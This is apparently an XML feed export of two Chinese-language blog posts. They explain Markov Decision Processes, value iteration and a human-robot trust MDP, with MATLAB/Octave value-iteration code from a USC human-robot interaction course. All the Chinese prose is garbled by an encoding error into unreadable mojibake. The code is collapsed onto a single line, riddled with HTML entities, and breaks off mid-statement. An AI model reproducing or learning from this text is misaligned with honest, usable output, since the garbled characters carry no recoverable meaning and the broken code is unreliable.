ä½†ç•¶é€™éš»æ©Ÿå™¨äººæƒ³è¦å¾€ä¸Šèµ°ï¼Œä»–åªæœ‰ 80% çš„æ©Ÿç‡æœƒçœŸçš„èµ°åˆ°ä¸Šé¢é‚£ä¸€æ ¼ï¼Œå¦å¤–æœ‰ 10% çš„æ©Ÿç‡æœƒèµ°åˆ°å³é‚Šé‚£æ ¼ã€10% çš„æ©Ÿç‡æœƒèµ°åˆ°å·¦é‚Šé‚£æ ¼ã€‚
(This image comes from UC Berkeley CS188 Lecture 8)
é€™æ™‚å€™å°±å°·å°¬äº†ï¼Œå› ç‚ºç•¶é€™éš»æ©Ÿå™¨äººé‚„æ²’å¯¦éš›é–‹å§‹èµ°ï¼Œä»–å…¶å¯¦ä¸çŸ¥é“æ¥ä¸‹ä¾†æœƒç™¼ç”Ÿä»€éº¼äº‹ã€‚ä»–ä¸çŸ¥é“ç•¶ä»–è¦å¾€ä¸Šèµ°ï¼Œæœƒä¸æœƒçœŸæ­£å¾€ä¸Šã€‚
é€™ç¨®å•é¡Œï¼Œæˆ‘å€‘ç¨±åš non-deterministic search problemï¼Œä¹Ÿå°±æ˜¯ä½ ç„¡æ³•äº‹å…ˆåšå¥½æ‰€æœ‰è¦åŠƒï¼Œå› ç‚ºä½ æ¡å–æŸå€‹ actionï¼Œç„¡æ³• determine æœƒç”¢ç”Ÿä»€éº¼çµæœã€‚
åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œæ©Ÿå™¨äººå°±ä¸èƒ½åªæ˜¯ç”¨ä¸€äº›æœç´¢çš„æ¼”ç®—æ³•ï¼Œå¾—åˆ° â€œä¸Šä¸Šå³å³å³â€ é€™ç¨®å¯ä»¥ç„¡è…¦ç…§åšçš„æ­¥é©Ÿï¼Œå› ç‚ºåªè¦å…¶ä¸­æœ‰ä¸€æ­¥ä¸å¦‚é æœŸï¼Œé‚£å°±åˆ°ä¸äº†è‘›ä¾†åˆ†å¤š +1 åˆ†çš„çµ‚é»ã€‚
åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘å¸Œæœ›æ©Ÿå™¨äººå¯ä»¥æœ‰ä¸€å¥—æƒ³æ³•ï¼Œä»–å¯ä»¥çŸ¥é“åœ¨ä»€éº¼æƒ…æ³ä¸‹è©²æ€éº¼åšã€‚å‡è¨­ä»–ç¬¬ä¸€æ­¥æƒ³å¾€ä¸Šï¼Œå»å› ç‚ºé‚£ 10% çš„æ©Ÿç‡å‘å³äº†ã€‚é‚£æ²’é—œä¿‚ï¼Œå°±èµ° â€œå³ä¸Šä¸Šå³â€ å°±æ˜¯äº†ï¼Œåæ­£ä¸€æ¨£åˆ°å¾—äº†çµ‚é»ã€‚
æ©Ÿå™¨äººçš„é€™ä¸€å¥—æƒ³æ³•ï¼Œé€šå¸¸è¢«ç¨±åš Policyã€‚æ¯”èµ·ä¸€å€‹å¯ä»¥ç›´æ¥ç…§åšçš„ planï¼Œpolicy æ¯”è¼ƒåƒæ˜¯ä¸€å¥—è¦å‰‡ï¼Œå‘Šè¨´æ©Ÿå™¨äººåœ¨ä»€éº¼ state è¦åšä»€éº¼äº‹ã€‚
å»¶ä¼¸ä¸€ä¸‹ï¼Œæˆ‘å€‘å¯èƒ½é‡åˆ°éæŸäº›äººï¼Œæˆ–è‡ªå·±ä¹Ÿç™¼ç”Ÿéï¼Œé‚„ä¸å¤ªæœƒè®Šé€šï¼Œè¬›ä¸€å‹•æ‰åšä¸€å‹•ï¼Œé€™å°±åƒæ˜¯ ä½ é‚„åœ¨æŠ±æ€¨è€é—†ã€Œå¹¹å˜›ä¸ä¸€æ¬¡èªªæ¸…æ¥šã€å—ï¼Ÿæ–°é®®äººè©²çŸ¥é“ä½†å¾ˆå°‘äººå‘Šè¨´ä½ çš„è·å ´äº”ä»¶äº‹ è£¡é¢æåˆ°çš„å°è¡¨æ©Ÿä¾‹å­ã€‚
æ€éº¼ç”¨æ•¸å­¸ä¾†æè¿° MDPï¼Ÿé¦–å…ˆï¼Œæˆ‘å€‘éœ€è¦å®šç¾©ä¸€äº›åŸºæœ¬çš„æ±è¥¿ï¼Œä¾‹å¦‚æœ‰ï¼š

ç¸½å…±æœ‰å“ªäº›ç‹€æ…‹ï¼ˆæ©Ÿå™¨äººå¯ä»¥åœ¨è¿·å®®è£¡çš„æ¯ä¸€æ ¼ï¼‰
èµ·å§‹ç‹€æ…‹æ˜¯ä»€éº¼ï¼ˆæ©Ÿå™¨äººåœ¨æœ€å·¦ä¸‹è§’çš„é‚£ä¸€æ ¼ï¼‰
å¯ä»¥æ¡å–çš„è¡Œå‹•ï¼ˆå¾€ä¸Šã€å¾€ä¸‹ã€å¾€å·¦ã€å¾€å³èµ°ï¼‰
è½‰ç§»çš„æ©Ÿç‡ï¼ˆä¾‹å¦‚åœ¨æŸä¸€æ ¼ s_kï¼Œæ¡å–çš„ action æ˜¯å¾€ä¸Šèµ°ï¼Œé‚£åªæœ‰ 0.8 çš„æ©Ÿç‡æœƒè®“ sâ€™ çœŸçš„æ˜¯ s_k çš„ä¸Šæ–¹é‚£ä¸€æ ¼ï¼›å„è‡ªæœ‰ 0.1 çš„æ©Ÿç‡æœƒè®“ sâ€™ è½åœ¨ s_k çš„å·¦é‚Šæˆ–å³é‚Šï¼‰
åˆ°é”æŸå€‹ç‹€æ…‹ç²å¾—çš„çè³ï¼ˆä¾‹å¦‚èµ°åˆ° -1 é‚£æ ¼å°±æœƒè¢«æ‰£ä¸€åˆ†ï¼‰

å¯«æˆæ•¸å­¸ç¬¦è™Ÿè®Šæˆä¸‹é¢é€™æ¨£ï¼š
(This image comes from UC Berkeley CS188 Lecture 8)
å¦å¤–ï¼Œè€ƒæ…®åˆ°æˆ‘å€‘æƒ³è¦è§£çš„æ±è¥¿ï¼Œæˆ‘å€‘é‚„éœ€è¦å®šç¾©

rewardï¼ˆä¸‹é¢ç”¨ value ä¾†è¡¨ç¤ºï¼‰
Q-stateï¼ˆQ(s,a) è¡¨ç¤ºä½ å·²ç¶“å¾ state s é¸æ“‡äº† a actionï¼Œä½†å› ç‚º a action ç”¢ç”Ÿçš„çµæœæ˜¯ä»€éº¼é‚„ä¸ç¢ºå®šï¼Œæ‰€ä»¥æˆ‘å€‘æŠŠé€™å€‹é‚„æ²’æ±ºå®šçš„ state ç¨±ä½œ Q-stateï¼‰
policyï¼ˆå°±æ˜¯æˆ‘å€‘å¸Œæœ›å­¸åˆ°çš„æ±è¥¿ï¼Œè®“æ©Ÿå™¨äººçŸ¥é“åœ¨ä»€éº¼ state åº•ä¸‹è©²æ¡å–ä»€éº¼ actionï¼‰

(This image comes from UC Berkeley CS188 Lecture 8)
æ€éº¼è§£ MDPï¼Ÿå®šç¾©å®Œä¸Šé¢é€™äº›æ•¸å­¸ç¬¦è™Ÿä¹‹å¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘ä¾†è¬›è§£ä¸€ä¸‹è©²æ€éº¼è§£ã€‚

å‡è¨­æˆ‘å€‘åœ¨ state sï¼Œæˆ‘å€‘å¸Œæœ›å¯ä»¥æŒ‘åˆ°è®“ Q-state value æœ€å¤§çš„ actionï¼›


è€Œ Q-state value è¦æœ€å¤§ï¼Œå°±çœ‹é€™å€‹ Q-state æœƒè½åˆ°å“ªäº› sâ€™ï¼Œé€™äº› sâ€™ æ‰€å¸¶ä¾†çš„ value æœƒæœ€å¤§ï¼š

ç‚ºä½•å¼å­æœƒé•·æˆä¸Šé¢é€™æ¨£ï¼Ÿå› ç‚ºæˆ‘å€‘ç”¨ $$T(s, a, sâ€™)$$ ä¾†è¡¨ç¤ºå¾ state sï¼Œæ¡å– action aï¼Œæœƒè®Šæˆ state sâ€™çš„æ©Ÿç‡ã€‚é€™å€‹æ©Ÿç‡å†ä¹˜ä¸Š sâ€™ çš„ rewardï¼Œé‚„æœ‰ sâ€™ æœƒå¾—åˆ°çš„ valueï¼Œå°±æ˜¯æˆ‘å€‘é æœŸ Q-state æœƒå¸¶ä¾†çš„å¥½è™•ã€‚

æŠŠ 1. çš„ $$V^*(s)$$ ç”¨ 2. å±•é–‹ï¼š



æœ€å¾Œï¼ŒæŠŠé€™äº›æ­¥é©Ÿåˆèµ·ä¾†ï¼Œå°±æœƒå¾—åˆ°ä¸€å€‹å¯ä»¥æ…¢æ…¢æ”¶æ–‚çš„æ¼”ç®—æ³•ã€‚

ä»¥ä¸€é–‹å§‹çš„è¿·å®®ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘ç¶“é 100 æ¬¡ iterationï¼Œå°±æœƒçŸ¥é“åœ¨æ¯å€‹ stateï¼Œå¾€å“ªé‚Šèµ°æœƒå¾—åˆ°æœ€å¤§çš„ valueï¼Œé€™äº› value è·Ÿ action æ–¹å‘é¡¯ç¤ºåœ¨ä¸‹åœ–ï¼š

è€Œé€™å…¶å¯¦å°±æ˜¯è®“æ©Ÿå™¨äººçŸ¥é“ä»–åœ¨ä¸åŒ state è©²æ€éº¼é¸æ“‡ action çš„ policyã€‚
MDP çš„æ‡‰ç”¨åŸºæœ¬ä¸Šåªè¦æ˜¯é€£çºŒæ±ºç­–ã€è€Œä¸”åœ¨æ±ºç­–éç¨‹ä¸­çš„è¡Œå‹•å…·æœ‰ä¸ç¢ºå®šæ€§ï¼Œå°±å¯ä»¥ç”¨ MDP ä¾†è™•ç†ã€‚
æ¯”å¦‚èªªè©²è¦æ€éº¼æŠ•è³‡è‚¡ç¥¨ã€æ€éº¼è·Ÿäººå°è©±ç­‰ç­‰ï¼Œæœ‰å¾ˆå¤šæœ‰è¶£çš„æ‡‰ç”¨ã€‚æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒ é€™ç¯‡æ–‡ç«  - Real Applications of Markov Decision Processes æˆ– é€™å€‹ç­”æ¡ˆã€‚
MDP çš„é™åˆ¶é›–ç„¶æˆ‘å€‘å·²ç¶“å­¸æœƒæ€éº¼ç”¨ MDP ä¾†ç²å¾—ä¸€å€‹ policyï¼Œä½† MDP æœ‰ä¸€äº›é™åˆ¶æ˜¯æˆ‘å€‘éœ€è¦çŸ¥é“çš„ï¼Œæ‰èƒ½å¤ åœ¨å°çš„åœ°æ–¹æ­£ç¢ºä½¿ç”¨ï¼š

ç„¡æ³•è™•ç†éä¸Šå¸è¦–è§’çš„å•é¡Œï¼šæˆ‘å€‘ç”Ÿæ´»çš„ä¸–ç•Œä¸­ï¼Œæœ‰å¾ˆå¤šæ±è¥¿æ˜¯æˆ‘å€‘é‚„ç„¡æ³•è§€æ¸¬åˆ°çš„ï¼ˆæ¯”å¦‚äººå…§å¿ƒçš„æƒ³æ³•ã€æ¯”å¦‚å®‡å®™ä¸­çš„æš—ç‰©è³ªï¼‰ï¼Œæ‰€ä»¥æˆ‘å€‘ç„¡æ³•æè¿°é€™ä¸–ç•Œçš„çœŸå¯¦ç‹€æ…‹ï¼Œé€™ç¨®å•é¡Œå°±ç”±æ›´é€²éšçš„ Partially Observable Markov Decision Processes ä¾†å˜—è©¦ modelã€‚
åªè€ƒæ…®åˆ° rewardï¼Œæ²’è€ƒæ…®åˆ°æ¡å– action çš„ costï¼šæˆ‘å€‘åœ¨æ¡å–è¡Œå‹•æ™‚ï¼Œé™¤äº†æœƒè€ƒæ…®ç²å¾—çš„ rewardï¼Œä¹Ÿæœƒè€ƒæ…®ä»˜å‡ºçš„ä»£åƒ¹ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒé€™ç¯‡ The naÃ¯ve utility calculus: Joint inferences about the costs and rewards of actionsã€‚

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº† MDP çš„åŸºæœ¬è§€å¿µè·Ÿæ•¸å­¸è§£æ³•ï¼Œå¸Œæœ›å¤§å®¶åœ¨å­¸ç¿’ Reinforcement Learning æ™‚æœ‰æ›´ç´®å¯¦æ¸…æ¥šçš„åº•å­ã€‚
å»¶ä¼¸é–±è®€
UC Berkeley CS188 Intro to AI â€“ Course Materials

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Markov Decision Process</tag>
        <tag>Reinforcement Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Markov Decision Process çš„ç¨‹å¼ç¯„ä¾‹</title>
    <url>/2018/12/22/intro-to-mdp-program/</url>
    <content><![CDATA[å‰è¨€ä¹‹å‰è·Ÿå¤§å®¶ä»‹ç´¹é Markov Decision Processï¼ˆMDPï¼‰ çš„åŸç†è·Ÿæ•¸å­¸æ¨å° é‚„æœ‰ åœ¨ Human-Robot Interaction ä¸Šçš„æ‡‰ç”¨ï¼Œä»Šå¤©æˆ‘å€‘å°±å¸¶å¤§å®¶é€éä¸€å€‹ç¨‹å¼ä¾†é«”é©—å¯¦ä½œä¸Šçš„ç´°ç¯€ã€‚æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥é€éé€™å€‹ä¾‹å­å°‡é€™å€‹ç¨‹å¼æ‡‰ç”¨åˆ°æ©Ÿå™¨äººä¸Šï¼
å¿«é€Ÿè¤‡ç¿’ MDP çš„åŸºæœ¬æ¦‚å¿µåœ¨é€²å…¥å•é¡Œä¹‹å‰ï¼Œæˆ‘å€‘å…ˆç°¡å–®è¤‡ç¿’ä¸€ä¸‹ MDPï¼Œé¦–å…ˆæ˜¯ MDP çš„å®šç¾©ï¼š

ç„¶å¾Œï¼Œå‡è¨­å·²ç¶“çŸ¥é“åœ¨æ¯å€‹ state æœƒç²å¾—å¤šå°‘ rewardï¼Œæˆ‘å€‘å°±å¯ä»¥ç”¨ value iteration çš„æ¼”ç®—æ³•ç®—å‡ºåœ¨å„ state è©²æ¡å–å“ªå€‹ action å¯ä»¥ç²å¾—æœ€é«˜çš„ rewardï¼ˆä¹Ÿå°±æ˜¯ç²å¾— optimal policyï¼‰ï¼š

å¦‚æœè¦ºå¾—çœ‹ä¸å¤ªæ‡‚ä¹Ÿæ²’é—œä¿‚ï¼Œå¯ä»¥å›å»çœ‹ Markov Decision Processï¼ˆMDPï¼‰ çš„åŸç†è·Ÿæ•¸å­¸æ¨å°ã€‚
ç¨‹å¼å ´æ™¯èªªæ˜ä»Šå¤©æˆ‘å€‘è¦è¨è«–çš„ç¨‹å¼ï¼Œæ˜¯å‡è¨­æˆ‘å€‘è¦å¯¦ä½œå¦‚ä¸‹å ´æ™¯ï¼š
ä»Šå¤©ä½ æœ‰ä¸€éš»æ©Ÿå™¨äººè¦å¹«ä½ æ¸…ç†æ¡Œå­ï¼Œæ¡Œä¸Šæœ‰ä¸€å€‹å¯¶ç‰¹ç“¶ï¼ˆbottleï¼‰è·Ÿä¸€å€‹ç»ç’ƒæ¯ï¼ˆglassï¼‰ï¼Œæ©Ÿå™¨äººæ‡‰è©²è¦æŠŠå¯¶ç‰¹ç“¶è·Ÿç»ç’ƒæ¯éƒ½æ‹¿èµ·ä¾†ï¼Œä½†ä½ é‚„ä¸å¤ªç¢ºå®šé€™éš»æ©Ÿå™¨äººèƒ½ä¸èƒ½é †åˆ©åœ°å®Œæˆæ¸…ç†çš„ä»»å‹™ã€‚
éš¨è‘—ä½ å°é€™éš»æ©Ÿå™¨äººçš„è§€å¯Ÿï¼Œä½ å¯èƒ½æœƒè¶Šä¾†è¶Šç›¸ä¿¡æˆ–è¶Šä¾†è¶Šä¸ä¿¡ä»–æœƒæŠŠäº‹æƒ…åšå¥½ï¼Œè€Œç•¶ä½ ä¸ä¿¡é€™éš»æ©Ÿå™¨äººçš„æ™‚å€™ï¼Œä½ å°±æœƒæƒ³è¦å‡ºæ‰‹å¹²æ¶‰ä»–çš„è¡Œç‚ºã€‚
è·Ÿ MDP çš„ç¬¦è™Ÿç›¸æ¥é¦–å…ˆï¼Œæˆ‘å€‘è¦å…ˆçŸ¥é“æˆ‘å€‘å¿…é ˆå®šç¾©æ¸…æ¥š stateã€actionã€transition matrix è·Ÿ rewardã€‚å› ç‚ºé€™æ˜¯æ‰€æœ‰ MDP å•é¡Œå¿…å‚™çš„å…ƒç´ ã€‚
å†ä¾†ï¼Œå› ç‚ºæˆ‘å€‘ç¾åœ¨çš„å•é¡Œç‰½æ¶‰åˆ°äººé¡ç›¸ä¸ç›¸ä¿¡æ©Ÿå™¨äººï¼Œæ‰€ä»¥ state æœƒå¾å–®ç´”åªæœ‰ world stateï¼ˆbottleã€glass çš„ç‹€æ…‹ï¼‰å»¶ä¼¸åˆ°é‚„æœ‰ human stateã€‚è€Œä¸”ï¼Œaction ä¹Ÿæœ‰åˆ† human è·Ÿ robot çš„ actionã€‚
æˆ‘å€‘æŠŠ state è·Ÿ action å®šç¾©æ¸…æ¥šï¼š

äººé¡çš„ state å¯ä»¥åˆ†æˆç›¸ä¿¡æˆ–ä¸ç›¸ä¿¡


ä¸–ç•Œä¸­çš„ state å¯ä»¥æ ¹æ“š bottle å’Œ glass åœ¨æ¡Œä¸Šã€æ©Ÿå™¨äººæ‰‹ä¸Šã€äººæ‰‹ä¸Šä¾†å€åˆ†ï¼ˆå…©ç¨®ç‰©é«”éƒ½å„æœ‰ä¸‰ç¨®å¯èƒ½ï¼Œæ‰€ä»¥å…±æœ‰ 3*3&#x3D;9 ç¨® stateï¼‰
 


ç„¶å¾Œï¼Œæˆ‘å€‘æŠŠ transition å®šç¾©æ¸…æ¥šï¼š

ç•¶æ©Ÿå™¨äººé¸æ“‡å»æ‹¿ bottle æˆ– glassï¼Œäººé¡å‡ºæ‰‹å¹²é çš„æ©Ÿç‡
 å¾ä¸‹è¡¨ä¸­å¯ä»¥çœ‹å‡ºï¼Œè‹¥äººç›¸ä¿¡æ©Ÿå™¨äººï¼Œç•¶æ©Ÿå™¨äººè¦æ‹¿ bottle æ™‚ï¼Œäººå¹²é çš„æ©Ÿç‡æ˜¯ 0.1ï¼›è‹¥äººç›¸ä¿¡æ©Ÿå™¨äººï¼Œç•¶æ©Ÿå™¨äººè¦æ‹¿ glass æ™‚ï¼Œäººå¹²é çš„æ©Ÿç‡æ˜¯ 0.2ï¼›ä¾æ­¤é¡æ¨ã€‚
 
 é€™å¼µåœ–ä¸­æœ‰é»å°éŒ¯èª¤ï¼Œç¬¬ä¸€åˆ—çš„æœ€å³æ¬„æ‡‰è©²æ˜¯ $P(a^H_t&#x3D;Intervene|s^H_t, a^R_t)$ã€‚

ç•¶äººå·²ç¶“å‡ºæ‰‹å¹²é ï¼ˆæˆ–ä¸å¹²é ï¼‰ï¼Œworld state æœƒæ€éº¼è®ŠåŒ–
 

äººçš„ state æœƒæ€éº¼è®ŠåŒ–
 


æœ‰äº†ä»¥ä¸Šçš„é€™äº›æ©Ÿç‡ä¹‹å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥è¨ˆç®— transition matrixã€‚
æœ€å¾Œï¼Œæˆ‘å€‘éœ€è¦å®šç¾© rewardï¼š

å¯©è¦–ä¸€ä¸‹ç¾åœ¨çš„ modelï¼Œé‚„ç¼ºä¸€äº›æ¨å°çœ‹åˆ°é€™é‚Šï¼Œå¤§å®¶æ‡‰è©²æœƒè¦ºå¾—ä¸å¤ªæ‡‚ï¼Œæ€éº¼æ„Ÿè¦ºèµ·ä¾†è·Ÿä¹‹å‰å­¸åˆ°çš„ MDP ä¸å¤ªä¸€æ¨£ï¼Ÿä¹‹å‰æˆ‘å€‘å­¸åˆ°çš„æ˜¯æˆ‘å€‘åªæœ‰ä¸€å€‹æ©Ÿå™¨äººæœƒæ¡å– actionï¼Œä½†å› ç‚º action æœƒå¸¶ä¾†çš„çµæœæ˜¯ non-deterministicï¼Œæ‰€ä»¥æˆ‘å€‘æ‰éœ€è¦ MDP ä¾† modelã€‚
ä½†æŒ‰ç…§æˆ‘å€‘ä¸Šé¢çš„å®šç¾©ï¼Œæˆ‘å€‘æœƒç•«å‡ºä¸€å€‹é€™æ¨£çš„ graphï¼š


human stateï¼ˆ$s^H_t$ï¼‰è·Ÿ robot actionï¼ˆ$a^R_t$ï¼‰ æœƒæ±ºå®š human actionï¼ˆ$a^H_t$ï¼‰
$s^H_t$ã€$a^R_t$ è·Ÿ $a^H_t$ æœƒæ±ºå®šä¸‹ä¸€æ™‚åˆ» t+1 çš„ human state
â€¦ä¾æ­¤é¡æ¨

é€™è·Ÿæˆ‘å€‘åŸæœ¬èªçŸ¥çš„ MDPï¼š

é•·å¾—ä¸å¤§ä¸€æ¨£ã€‚
é–‹å§‹æ¨å°æˆ MDPå·§å¦™çš„åœ°æ–¹ä¾†äº†ï¼Œæˆ‘å€‘å¯ä»¥å°‡ state space ç”¨ human state è·Ÿ world state ä¸€èµ·å®šç¾©
$$ S &#x3D; S^H * S^W$$
æ‰€ä»¥é€™å¼µåœ–è£¡é¢çš„ human state space å’Œ world state space å°±å¯ä»¥åˆä½µï¼ˆç´…çš„åˆåœ¨ä¸€èµ·ã€è—çš„åˆåœ¨ä¸€èµ·ï¼‰ï¼š

ç„¶å¾Œï¼Œæˆ‘å€‘å¯ä»¥æŠŠ $a^H_t$ è¦–ç‚º MDP è£¡é¢çš„ä¸ç¢ºå®šå› ç´ ã€‚å› ç‚ºæ©Ÿå™¨äººç„¡æ³•æŒæ¡äººçš„è¡Œç‚ºï¼Œæ‰€ä»¥æ©Ÿå™¨äººä¸çŸ¥é“è‡ªå·±ä»Šå¤©è‹¥å»æŠ“ bottleï¼Œåˆ°åº•èƒ½ä¸èƒ½åˆ°é” â€œæˆåŠŸæŠ“èµ· bottleâ€ çš„ stateï¼Œè€Œé€™å°±æ˜¯ç¬¦åˆåŸæœ¬ MDP ç²¾ç¥çš„åœ°æ–¹ã€‚
é›–ç„¶æ¥ä¸‹ä¾†é‚„æœ‰ä¸€äº›æ•¸å­¸ä¸Šçš„æ¨å°ï¼Œä¸éå€‹äººè¦ºå¾—æœ‰é»å¤ªéç´°ç¯€ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥å»çœ‹çœ‹ é€™å€‹ note çš„ page.5-6ï¼Œå°æ–¼æ©Ÿç‡çš„ marginalization ç„¡æ„Ÿçš„è©±å¯ä»¥çœ‹æˆ‘ä¹‹å‰å¯«çš„ Why do we need marginalization in probability? (ç‚ºä»€éº¼æˆ‘å€‘åœ¨æ©Ÿç‡ä¸­éœ€è¦è¨è«–é‚Šç·£åŒ–)ã€‚
ç¨‹å¼ç¢¼æ•´æ®µ code ä¸»è¦çš„é †åºé‚„æ˜¯

å®šç¾© state
å®šç¾©ä¸€äº›åŸºæœ¬çš„è½‰æ›æ©Ÿç‡ï¼ˆç‚ºäº†è¨ˆç®—ã€€transition matrixï¼‰
è¨ˆç®— transition matrix
å®šç¾© reward
ç”¨ value iteration ç®—å‡º optimal policy

ç„¶å¾Œå°±ä¸Š code å•¦ï¼š
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% CSCI 699: Computational Human-Robot Interaction %%%%%%%%%% Fall 2018, University of Southern California    %%%%%%%%%% Author: Stefanos Nikolaidis, nikolaid@usc.edu   %%%%%%%%%% Commented by: Po-Jen Lai, pojenlai@usc.edu      %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% clear allclose all ## å®šç¾© state human_states_str = &#123;&#x27;no_trust&#x27;, &#x27;trust&#x27;&#125;; Label.BOTTLE = 1;Label.GLASS = 2; Label.ON_TABLE = 1;Label.PICKED_BY_ROBOT = 2;Label.PICKED_BY_HUMAN = 3; Label.NO_TRUST = 1;Label.TRUST = 2; objstate_str = &#123;&#x27;on_table&#x27;,&#x27;picked_robot&#x27;,&#x27;picked_human&#x27;&#125;;ractions_str = &#123;&#x27;pick_bottle&#x27;,&#x27;pick_glass&#x27;&#125;; ## å®šç¾©ä¸€äº›åŸºæœ¬çš„è½‰æ›æ©Ÿç‡ï¼ˆç‚ºäº†è¨ˆç®—ã€€transition matrixï¼‰ %&#123;no_trust,trust&#125; x&#123;bottle, glass&#125;PROB_TRUST_INCREASE = [0.8 0.9;    0.0 0.0]; %&#123;no_trust,trust&#125; x &#123;bottle,glass&#125;PROB_TRUST_INTERVENE = [0.3 0.8;    0.1 0.2]; counter = 1;for ii = 1:3 %for each object    for jj = 1:3 %for each  state        world_states(counter,:) = [ii,jj];        counter = counter + 1;    endendnum_human_states = length(human_states_str);num_world_states = counter -1;num_trust_states = 2;num_states = num_world_states*num_trust_states;num_ractions = length(ractions_str); ## è¨ˆç®— transition matrix Trans = zeros(num_states,num_ractions,num_states); for sh = 1:num_human_states    for sw = 1:num_world_states        for ra = 1:num_ractions            world_state = world_states(sw,:);            ss = (sh-1)*num_world_states + sw;                        %picked by robot            new_world_state = world_state;            new_world_state(ra) =Label.PICKED_BY_ROBOT;            nsw = findWorldState(new_world_state,world_states);                        nsh = sh; %trust stays the same            nss = (nsh-1)*num_world_states + nsw;            Trans(ss,ra,nss) = (1-PROB_TRUST_INTERVENE(sh,ra))*(1-PROB_TRUST_INCREASE(sh,ra));                        if sh == 1 %trust can increase only if low                nsh = sh+1;                nss = (nsh-1)*num_world_states + nsw;                Trans(ss,ra,nss) = (1-PROB_TRUST_INTERVENE(sh,ra))*PROB_TRUST_INCREASE(sh,ra);            end                        %picked by human            new_world_state = world_state;            new_world_state(ra) =Label.PICKED_BY_HUMAN;            nsw = findWorldState(new_world_state,world_states);                        nsh = sh; %trust stays the same            nss = (nsh-1)*num_world_states + nsw;            Trans(ss,ra,nss) = PROB_TRUST_INTERVENE(sh,ra);        end    endend disp(&#x27; &#x27;)disp(&#x27;Transition Matrix&#x27;)for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        nIndices = find(Trans(ss,ra,:)&gt;0);        %do not worry about invalid actions        if (world_states(sw,ra) == Label.ON_TABLE)            str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27; and robot does~&#x27; , ractions_str&#123;ra&#125;,&#x27;:&#x27;);            disp(str);            for nn = 1:length(nIndices)                nss = nIndices(nn);                                nsh = floor(nss/(num_world_states+1)) + 1;                nsw = nss - (nsh-1)*num_world_states;                str = strcat(&#x27;then the prob of ~&#x27;, human_states_str&#123;nsh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(nsw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(nsw,2)),&#x27;:&#x27;,num2str(Trans(ss,ra,nss)));                disp(str);            end        end    endend ## å®šç¾© reward %reward functionRew = zeros(num_states,num_ractions);for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;                  %say bonus if starts with glass         if (world_states(sw,Label.GLASS)==Label.PICKED_BY_ROBOT)&amp;&amp; (world_states(sw,Label.BOTTLE)==Label.ON_TABLE)           Rew(ss,ra) = 5;         end                  %if we are not in a final state        if (world_states(sw,1)==Label.ON_TABLE) || (world_states(sw,2)==Label.ON_TABLE)            if world_states(sw,ra)~= Label.ON_TABLE %penalize infeasible actions                Rew(ss,ra) = -1000;            end        end    endend %add positive reward for goal.goal = findWorldState([Label.PICKED_BY_ROBOT, Label.PICKED_BY_ROBOT],world_states);for ra = 1:num_ractions    for sh = 1:2        ss = (sh-1)*num_world_states + goal;        Rew(ss,ra) = 10;    endend %print reward functiondisp(&#x27; &#x27;)disp(&#x27;reward function&#x27;)for ss = 1:num_states    for ra = 1:num_ractions        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27;and robot action is~&#x27;,ractions_str&#123;ra&#125;, &#x27; then reward is: &#x27;,num2str(Rew(ss,ra)));        disp(str);    endend ## ç”¨ value iteration ç®—å‡º optimal policy %value iterationT = 3;V = zeros(num_states,1);policy = zeros(num_states,T);new_V = zeros(num_states,1);Q = zeros(num_states, num_ractions);for tt = T:-1:1    for ss = 1:num_states                 %check if terminal state        if ss == 12            debug = 1;        end        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        if ((world_states(sw,1)~=Label.ON_TABLE) &amp;&amp; (world_states(sw,2)~=Label.ON_TABLE))            new_V(ss) = Rew(ss,1);            policy(ss,tt) = 1;            continue;        end                          maxV = -1e6;        maxIndx = -1;        for ra = 1:num_ractions            res = Rew(ss,ra);            for nss = 1:num_states                res = res +  Trans(ss,ra,nss)*V(nss);            end            Q(ss,ra) = res;            if res &gt; maxV                maxV = res;                maxIndx = ra;            end        end        new_V(ss) = maxV;        policy(ss,tt) = maxIndx;    end    V = new_V;end disp(&#x27; &#x27;)disp(&#x27;policy&#x27;)%print policyfor tt = 1    tt    for ss = 1:num_states        sh = floor(ss/(num_world_states+1)) + 1;        sw = ss - (sh-1)*num_world_states;        if ((world_states(sw,1) == Label.ON_TABLE)||(world_states(sw,2) == Label.ON_TABLE)) %we care only about feasible states            str = strcat(&#x27;if~&#x27;, human_states_str&#123;sh&#125; , &#x27; and 